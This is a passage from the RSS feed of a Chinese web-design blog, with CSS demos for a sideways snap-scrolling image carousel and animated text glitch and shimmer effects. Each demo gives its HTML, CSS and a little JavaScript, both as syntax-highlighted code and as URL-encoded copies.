  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;</span>section</span><span>></span></span><span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>scroll-snap-type</span><span>:</span> y mandatory<span>;</span>
  <span>overflow-y</span><span>:</span> scroll<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> center/cover no-repeat<span>;</span>
  <span>scroll-snap-align</span><span>:</span> start<span>;</span>
<span>}</span>

<span>section:nth-child(1)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-3.webp<span>)</span></span><span>;</span>
<span>}</span>

<span>section:nth-child(2)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-4.webp<span>)</span></span><span>;</span>
<span>}</span>

<span>section:nth-child(3)</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-5.webp<span>)</span></span><span>;</span>
<span>}</span>

<span>::-webkit-scrollbar</span> <span>{</span>
  <span>width</span><span>:</span> 0<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div>
            </div>
          </div>
          
        </div>
<blockquote>
<p>旋转后横向滚动</p>
</blockquote>

          <div
            id="code-demo-7c89cc7e"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cdiv%20class%3D%5C%22container%5C%22%3E%5Cn%20%20%3Cmain%3E%5Cn%20%20%20%20%3Csection%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22img%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fsection%3E%5Cn%20%20%20%20%3Csection%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22img%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fsection%3E%5Cn%20%20%20%20%3Csection%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22img%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fsection%3E%5Cn%20%20%3C%2Fmain%3E%5Cn%3C%2Fdiv%3E%5Cn%22%2C%22css%22%3A%22.container%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20--demo-width%3A%20778px%3B%20%2F*%20%E4%B8%BA%E4%BA%86%E9%80%82%E9%85%8D%E5%B1%8F%E5%B9%95%EF%BC%8C%E5%AE%BD%E5%BA%A6%E4%BD%BF%E7%94%A8%20JS%20%E5%8A%A8%E6%80%81%E8%AE%BE%E7%BD%AE%20*%2F%5Cn%7D%5Cn%5Cnmain%20%7B%5Cn%20%20height%3A%20var(--demo-width)%3B%5Cn%20%20scroll-snap-type%3A%20y%20mandatory%3B%5Cn%20%20overflow-y%3A%20scroll%3B%5Cn%20%20transform%3A%20rotate(-90deg)%20translateX(calc(-1%20*%20var(--demo-width)))%3B%5Cn%20%20transform-origin%3A%20left%20top%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20width%3A%20var(--demo-width)%3B%5Cn%20%20height%3A%20var(--demo-width)%3B%5Cn%20%20scroll-snap-align%3A%20start%3B%5Cn%20%20transform%3A%20rotate(90deg)%20translateY(calc(-1%20*%20var(--demo-width)))%3B%5Cn%20%20transform-origin%3A%20left%20top%3B%5Cn%7D%5Cn%5Cn.img%20%7B%5Cn%20%20width%3A%20var(--demo-width)%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20center%2Fcover%20no-repeat%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(1)%20.img%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-3.webp)%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(2)%20.img%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-4.webp)%3B%5Cn%7D%5Cn%5Cnsection%3Anth-child(3)%20.img%20%7B%5Cn%20%20background-image%3A%20url(..%2F..%2Fimages%2FWives%2FBingBing-5.webp)%3B%5Cn%7D%5Cn%5Cn%3A%3A-webkit-scrollbar%20%7B%5Cn%20%20width%3A%200%3B%5Cn%7D%5Cn%22%2C%22js%22%3A%22const%20container%20%3D%20document.querySelector('.container')%5Cn%5Cnconst%20setDemoWidth%20%3D%20()%20%3D%3E%20%7B%5Cn%20%20demoWidth%20%3D%20container.parentNode.offsetWidth%5Cn%20%20if%20(!demoWidth)%20return%20setDemoWidth()%5Cn%20%20container.style.setProperty('--demo-width'%2C%20%60%24%7BdemoWidth%7Dpx%60)%5Cn%7D%5Cn%5Cn%2F%2F%20%E6%AD%A4%20DEMO%20%E4%B8%AD%20onload%20%E4%BA%8B%E4%BB%B6%E6%97%A0%E6%95%88%EF%BC%8C%E5%8F%AF%E6%81%B6%5CnsetTimeout(setDemoWidth)%5Cnwindow.onresize%20%3D%20setDemoWidth%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>container<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>main</span><span>></span></span>
    <span><span><span>&lt;</span>section</span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>img<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>section</span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>img<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>section</span><span>></span></span>
    <span><span><span>&lt;</span>section</span><span>></span></span>
      <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>img<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span><span><span>&lt;/</span>section</span><span>></span></span>
  <span><span><span>&lt;/</span>main</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>.container</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>--demo-width</span><span>:</span> 778px<span>;</span> <span>/* 为了适配屏幕，宽度使用 JS 动态设置 */</span>
<span>}</span>

<span>main</span> <span>{</span>
  <span>height</span><span>:</span> <span>var</span><span>(</span>--demo-width<span>)</span><span>;</span>
  <span>scroll-snap-type</span><span>:</span> y mandatory<span>;</span>
  <span>overflow-y</span><span>:</span> scroll<span>;</span>
  <span>transform</span><span>:</span> <span>rotate</span><span>(</span>-90deg<span>)</span> <span>translateX</span><span>(</span><span>calc</span><span>(</span>-1 * <span>var</span><span>(</span>--demo-width<span>)</span><span>)</span><span>)</span><span>;</span>
  <span>transform-origin</span><span>:</span> left top<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>width</span><span>:</span> <span>var</span><span>(</span>--demo-width<span>)</span><span>;</span>
  <span>height</span><span>:</span> <span>var</span><span>(</span>--demo-width<span>)</span><span>;</span>
  <span>scroll-snap-align</span><span>:</span> start<span>;</span>
  <span>transform</span><span>:</span> <span>rotate</span><span>(</span>90deg<span>)</span> <span>translateY</span><span>(</span><span>calc</span><span>(</span>-1 * <span>var</span><span>(</span>--demo-width<span>)</span><span>)</span><span>)</span><span>;</span>
  <span>transform-origin</span><span>:</span> left top<span>;</span>
<span>}</span>

<span>.img</span> <span>{</span>
  <span>width</span><span>:</span> <span>var</span><span>(</span>--demo-width<span>)</span><span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> center/cover no-repeat<span>;</span>
<span>}</span>

<span>section:nth-child(1) .img</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-3.webp<span>)</span></span><span>;</span>
<span>}</span>

<span>section:nth-child(2) .img</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-4.webp<span>)</span></span><span>;</span>
<span>}</span>

<span>section:nth-child(3) .img</span> <span>{</span>
  <span>background-image</span><span>:</span> <span><span>url</span><span>(</span>../../images/Wives/BingBing-5.webp<span>)</span></span><span>;</span>
<span>}</span>

<span>::-webkit-scrollbar</span> <span>{</span>
  <span>width</span><span>:</span> 0<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br></div></div><div><pre><code><span>const</span> container <span>=</span> document<span>.</span><span>querySelector</span><span>(</span><span>'.container'</span><span>)</span>

<span>const</span> <span>setDemoWidth</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  demoWidth <span>=</span> container<span>.</span>parentNode<span>.</span>offsetWidth
  <span>if</span> <span>(</span><span>!</span>demoWidth<span>)</span> <span>return</span> <span>setDemoWidth</span><span>(</span><span>)</span>
  container<span>.</span>style<span>.</span><span>setProperty</span><span>(</span><span>'--demo-width'</span><span>,</span> <span><span>`</span><span><span>${</span>demoWidth<span>}</span></span><span>px</span><span>`</span></span><span>)</span>
<span>}</span>

<span>// 此 DEMO 中 onload 事件无效，可恶</span>
<span>setTimeout</span><span>(</span>setDemoWidth<span>)</span>
window<span>.</span>onresize <span>=</span> setDemoWidth
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>文字故障</title>
      <link>https://www.matrixtheone.ga/web/magic/Text-Fault/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Text-Fault/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">文字故障</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-676cd1fe"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Csection%20data-word%3D%5C%22Magic%5C%22%3E%5Cn%20%20%20%20Magic%5Cn%20%20%20%20%3Cspan%3E%3C%2Fspan%3E%5Cn%20%20%3C%2Fsection%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20position%3A%20relative%3B%5Cn%7D%5Cn%5Cnsection%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%2050%25%3B%5Cn%20%20left%3A%2050%25%3B%5Cn%20%20transform%3A%20translate(-50%25%2C%20-50%25)%3B%5Cn%20%20color%3A%20%23fff%3B%5Cn%20%20font-size%3A%2072px%3B%5Cn%20%20line-height%3A%2072px%3B%5Cn%7D%5Cn%5Cnsection%3A%3Abefore%20%7B%5Cn%20%20content%3A%20attr(data-word)%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20left%3A%200.02em%3B%5Cn%20%20height%3A%200%3B%5Cn%20%20z-index%3A%202%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20color%3A%20rgba(255%2C%20255%2C%20255%2C%200.9)%3B%5Cn%20%20text-shadow%3A%200.01em%200%200%20red%3B%5Cn%20%20filter%3A%20contrast(200%25)%3B%5Cn%20%20animation%3A%20red-shadow%201s%20ease-in%20infinite%3B%5Cn%7D%5Cn%5Cnsection%3A%3Aafter%20%7B%5Cn%20%20content%3A%20attr(data-word)%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20left%3A%20-0.06em%3B%5Cn%20%20height%3A%2070%25%3B%5Cn%20%20z-index%3A%203%3B%5Cn%20%20overflow%3A%20hidden%3B%5Cn%20%20color%3A%20rgba(255%2C%20255%2C%20255%2C%200.8)%3B%5Cn%20%20background%3A%20rgba(0%2C%200%2C%200%2C%200.9)%3B%5Cn%20%20text-shadow%3A%20-0.02em%200%200%20cyan%3B%5Cn%20%20filter%3A%20contrast(200%25)%3B%5Cn%20%20mix-blend-mode%3A%20darken%3B%5Cn%20%20animation%3A%20red-height%201.5s%20ease-out%20infinite%3B%5Cn%7D%5Cn%5Cnspan%20%7B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%207%25%3B%5Cn%20%20z-index%3A%204%3B%5Cn%20%20background%3A%20%23000%3B%5Cn%20%20animation%3A%20white-move%203s%20ease-out%20infinite%3B%5Cn%7D%5Cn%5Cn%40keyframes%20red-shadow%20%7B%5Cn%20%2020%25%20%7B%5Cn%20%20%20%20height%3A%2090%25%3B%5Cn%20%20%7D%5Cn%20%2060%25%20%7B%5Cn%20%20%20%20height%3A%2010%25%3B%5Cn%20%20%7D%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20height%3A%20120%25%3B%5Cn%20%20%7D%5Cn%7D%5Cn%5Cn%40keyframes%20red-height%20%7B%5Cn%20%2020%25%20%7B%5Cn%20%20%20%20height%3A%20120%25%3B%5Cn%20%20%7D%5Cn%20%2035%25%20%7B%5Cn%20%20%20%20height%3A%2030%25%3B%5Cn%20%20%7D%5Cn%20%2050%25%20%7B%5Cn%20%20%20%20height%3A%20110%25%3B%5Cn%20%20%7D%5Cn%20%2060%25%20%7B%5Cn%20%20%20%20height%3A%2050%25%3B%5Cn%20%20%7D%5Cn%20%2070%25%20%7B%5Cn%20%20%20%20height%3A%2090%25%3B%5Cn%20%20%7D%5Cn%20%2080%25%20%7B%5Cn%20%20%20%20height%3A%2060%25%3B%5Cn%20%20%7D%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20height%3A%200%25%3B%5Cn%20%20%7D%5Cn%7D%5Cn%5Cn%40keyframes%20white-move%20%7B%5Cn%20%208%25%20%7B%5Cn%20%20%20%20top%3A%20110%25%3B%5Cn%20%20%7D%5Cn%20%2014%25%20%7B%5Cn%20%20%20%20top%3A%2020%25%3B%5Cn%20%20%7D%5Cn%20%2020%25%20%7B%5Cn%20%20%20%20top%3A%20120%25%3B%5Cn%20%20%7D%5Cn%20%2032%25%20%7B%5Cn%20%20%20%20top%3A%205%25%3B%5Cn%20%20%7D%5Cn%20%2099%25%20%7B%5Cn%20%20%20%20top%3A%2080%25%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>section</span> <span>data-word</span><span><span>=</span><span>"</span>Magic<span>"</span></span><span>></span></span>
    Magic
    <span><span><span>&lt;</span>span</span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span>
  <span><span><span>&lt;/</span>section</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>

<span>section</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 50%<span>;</span>
  <span>left</span><span>:</span> 50%<span>;</span>
  <span>transform</span><span>:</span> <span>translate</span><span>(</span>-50%<span>,</span> -50%<span>)</span><span>;</span>
  <span>color</span><span>:</span> #fff<span>;</span>
  <span>font-size</span><span>:</span> 72px<span>;</span>
  <span>line-height</span><span>:</span> 72px<span>;</span>
<span>}</span>

<span>section::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>attr</span><span>(</span>data-word<span>)</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0.02em<span>;</span>
  <span>height</span><span>:</span> 0<span>;</span>
  <span>z-index</span><span>:</span> 2<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>color</span><span>:</span> <span>rgba</span><span>(</span>255<span>,</span> 255<span>,</span> 255<span>,</span> 0.9<span>)</span><span>;</span>
  <span>text-shadow</span><span>:</span> 0.01em 0 0 red<span>;</span>
  <span>filter</span><span>:</span> <span>contrast</span><span>(</span>200%<span>)</span><span>;</span>
  <span>animation</span><span>:</span> red-shadow 1s ease-in infinite<span>;</span>
<span>}</span>

<span>section::after</span> <span>{</span>
  <span>content</span><span>:</span> <span>attr</span><span>(</span>data-word<span>)</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> -0.06em<span>;</span>
  <span>height</span><span>:</span> 70%<span>;</span>
  <span>z-index</span><span>:</span> 3<span>;</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>color</span><span>:</span> <span>rgba</span><span>(</span>255<span>,</span> 255<span>,</span> 255<span>,</span> 0.8<span>)</span><span>;</span>
  <span>background</span><span>:</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.9<span>)</span><span>;</span>
  <span>text-shadow</span><span>:</span> -0.02em 0 0 cyan<span>;</span>
  <span>filter</span><span>:</span> <span>contrast</span><span>(</span>200%<span>)</span><span>;</span>
  <span>mix-blend-mode</span><span>:</span> darken<span>;</span>
  <span>animation</span><span>:</span> red-height 1.5s ease-out infinite<span>;</span>
<span>}</span>

<span>span</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 7%<span>;</span>
  <span>z-index</span><span>:</span> 4<span>;</span>
  <span>background</span><span>:</span> #000<span>;</span>
  <span>animation</span><span>:</span> white-move 3s ease-out infinite<span>;</span>
<span>}</span>

<span><span>@keyframes</span> red-shadow</span> <span>{</span>
  <span>20%</span> <span>{</span>
    <span>height</span><span>:</span> 90%<span>;</span>
  <span>}</span>
  <span>60%</span> <span>{</span>
    <span>height</span><span>:</span> 10%<span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>height</span><span>:</span> 120%<span>;</span>
  <span>}</span>
<span>}</span>

<span><span>@keyframes</span> red-height</span> <span>{</span>
  <span>20%</span> <span>{</span>
    <span>height</span><span>:</span> 120%<span>;</span>
  <span>}</span>
  <span>35%</span> <span>{</span>
    <span>height</span><span>:</span> 30%<span>;</span>
  <span>}</span>
  <span>50%</span> <span>{</span>
    <span>height</span><span>:</span> 110%<span>;</span>
  <span>}</span>
  <span>60%</span> <span>{</span>
    <span>height</span><span>:</span> 50%<span>;</span>
  <span>}</span>
  <span>70%</span> <span>{</span>
    <span>height</span><span>:</span> 90%<span>;</span>
  <span>}</span>
  <span>80%</span> <span>{</span>
    <span>height</span><span>:</span> 60%<span>;</span>
  <span>}</span>
  <span>100%</span> <span>{</span>
    <span>height</span><span>:</span> 0%<span>;</span>
  <span>}</span>
<span>}</span>

<span><span>@keyframes</span> white-move</span> <span>{</span>
  <span>8%</span> <span>{</span>
    <span>top</span><span>:</span> 110%<span>;</span>
  <span>}</span>
  <span>14%</span> <span>{</span>
    <span>top</span><span>:</span> 20%<span>;</span>
  <span>}</span>
  <span>20%</span> <span>{</span>
    <span>top</span><span>:</span> 120%<span>;</span>
  <span>}</span>
  <span>32%</span> <span>{</span>
    <span>top</span><span>:</span> 5%<span>;</span>
  <span>}</span>
  <span>99%</span> <span>{</span>
    <span>top</span><span>:</span> 80%<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br></div></div>
            </div>
          </div>
          
        </div>
]]></content:encoded>
    </item>
    <item>
      <title>文字流光</title>
      <link>https://www.matrixtheone.ga/web/magic/Text-Flow/</link>
      <guid>https://www.matrixtheone.ga/web/magic/Text-Flow/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">文字流光</source>
      <category>CSS</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[
          <div
            id="code-demo-a10dac26"
           
  
 data-title=""

            data-code="%7B%22html%22%3A%22%3Cmain%3E%5Cn%20%20%3Cp%20data-text%3D%5C%22%E5%89%8D%E5%A4%A9%E7%9C%8B%E5%88%B0%E4%BA%86%E5%B0%8F%E5%85%94%E5%AD%90%EF%BC%8C%E6%98%A8%E5%A4%A9%E6%98%AF%E5%B0%8F%E9%B9%BF%EF%BC%8C%E4%BB%8A%E5%A4%A9%E6%98%AF%E4%BD%A0%5C%22%3E%5Cn%20%20%20%20%E5%89%8D%E5%A4%A9%E7%9C%8B%E5%88%B0%E4%BA%86%E5%B0%8F%E5%85%94%E5%AD%90%EF%BC%8C%E6%98%A8%E5%A4%A9%E6%98%AF%E5%B0%8F%E9%B9%BF%EF%BC%8C%E4%BB%8A%E5%A4%A9%E6%98%AF%E4%BD%A0%5Cn%20%20%3C%2Fp%3E%5Cn%3C%2Fmain%3E%5Cn%22%2C%22css%22%3A%22main%20%7B%5Cn%20%20width%3A%20100%25%3B%5Cn%20%20height%3A%20400px%3B%5Cn%20%20display%3A%20grid%3B%5Cn%20%20place-items%3A%20center%3B%5Cn%20%20background-image%3A%20radial-gradient(%5Cn%20%20%20%20farthest-side%20at%2020%25%2010%25%2C%5Cn%20%20%20%20%23455a64%200%25%2C%5Cn%20%20%20%20%23263238%2060%25%2C%5Cn%20%20%20%20%231a2327%20100%25%5Cn%20%20)%3B%5Cn%7D%5Cn%5Cnp%20%7B%5Cn%20%20position%3A%20relative%3B%5Cn%20%20font-size%3A%2035px%3B%5Cn%20%20user-select%3A%20none%3B%5Cn%20%20white-space%3A%20nowrap%3B%5Cn%20%20color%3A%20transparent%3B%5Cn%20%20background-color%3A%20%23e8a95b%3B%5Cn%20%20-webkit-background-clip%3A%20text%3B%5Cn%7D%5Cn%5Cnp%3A%3Abefore%20%7B%5Cn%20%20content%3A%20attr(data-text)%3B%5Cn%20%20position%3A%20absolute%3B%5Cn%20%20top%3A%200%3B%5Cn%20%20left%3A%200%3B%5Cn%20%20right%3A%200%3B%5Cn%20%20bottom%3A%200%3B%5Cn%20%20background%3A%20linear-gradient(%5Cn%20%20%20%20%20%20120deg%2C%5Cn%20%20%20%20%20%20transparent%200%25%2C%5Cn%20%20%20%20%20%20transparent%204%25%2C%5Cn%20%20%20%20%20%20white%209%25%2C%5Cn%20%20%20%20%20%20transparent%2010%25%2C%5Cn%20%20%20%20%20%20transparent%2012%25%2C%5Cn%20%20%20%20%20%20rgba(255%2C%20255%2C%20255%2C%200.3)%2018%25%2C%5Cn%20%20%20%20%20%20transparent%2020%25%2C%5Cn%20%20%20%20%20%20transparent%2022%25%2C%5Cn%20%20%20%20%20%20rgba(255%2C%20255%2C%20255%2C%200.6)%2025%25%2C%5Cn%20%20%20%20%20%20white%2026%25%2C%5Cn%20%20%20%20%20%20rgba(255%2C%20255%2C%20255%2C%200.3)%2027%25%2C%5Cn%20%20%20%20%20%20transparent%2030%25%2C%5Cn%20%20%20%20%20%20transparent%2033%25%2C%5Cn%20%20%20%20%20%20rgba(255%2C%20255%2C%20255%2C%200.3)%2035%25%2C%5Cn%20%20%20%20%20%20transparent%2042%25%2C%5Cn%20%20%20%20%20%20transparent%20100%25%5Cn%20%20%20%20)%200%25%200%25%2F%20150%25%20100%25%20no-repeat%3B%5Cn%20%20-webkit-background-clip%3A%20text%3B%5Cn%20%20animation%3A%20shine%205s%20infinite%20linear%3B%5Cn%7D%5Cn%5Cn%40keyframes%20shine%20%7B%5Cn%20%200%25%20%7B%5Cn%20%20%20%20background-position%3A%2050%25%200%3B%5Cn%20%20%7D%5Cn%20%20100%25%20%7B%5Cn%20%20%20%20background-position%3A%20-190%25%200%3B%5Cn%20%20%7D%5Cn%7D%5Cn%22%7D"
          >
              
              <div>
                <div>
<div><pre><code><span><span><span>&lt;</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>p</span> <span>data-text</span><span><span>=</span><span>"</span>前天看到了小兔子，昨天是小鹿，今天是你<span>"</span></span><span>></span></span>
    前天看到了小兔子，昨天是小鹿，今天是你
  <span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;/</span>main</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><div><pre><code><span>main</span> <span>{</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 400px<span>;</span>
  <span>display</span><span>:</span> grid<span>;</span>
  <span>place-items</span><span>:</span> center<span>;</span>
  <span>background-image</span><span>:</span> <span>radial-gradient</span><span>(</span>
    farthest-side at 20% 10%<span>,</span>
    #455a64 0%<span>,</span>
    #263238 60%<span>,</span>
    #1a2327 100%
  <span>)</span><span>;</span>
<span>}</span>

<span>p</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>font-size</span><span>:</span> 35px<span>;</span>
  <span>user-select</span><span>:</span> none<span>;</span>
  <span>white-space</span><span>:</span> nowrap<span>;</span>
  <span>color</span><span>:</span> transparent<span>;</span>
  <span>background-color</span><span>:</span> #e8a95b<span>;</span>
  <span>-webkit-background-clip</span><span>:</span> text<span>;</span>
<span>}</span>

<span>p::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>attr</span><span>(</span>data-text<span>)</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>right</span><span>:</span> 0<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>
      120deg<span>,</span>
      transparent 0%<span>,</span>
      transparent 4%<span>,</span>
      white 9%<span>,</span>
      transparent 10%<span>,</span>
      transparent 12%<span>,</span>
      <span>rgba</span><span>(</span>255<span>,</span> 255<span>,</span> 255<span>,</span> 0.3<span>)</span> 18%<span>,</span>
      transparent 20%<span>,</span>
      transparent 22%<span>,</span>
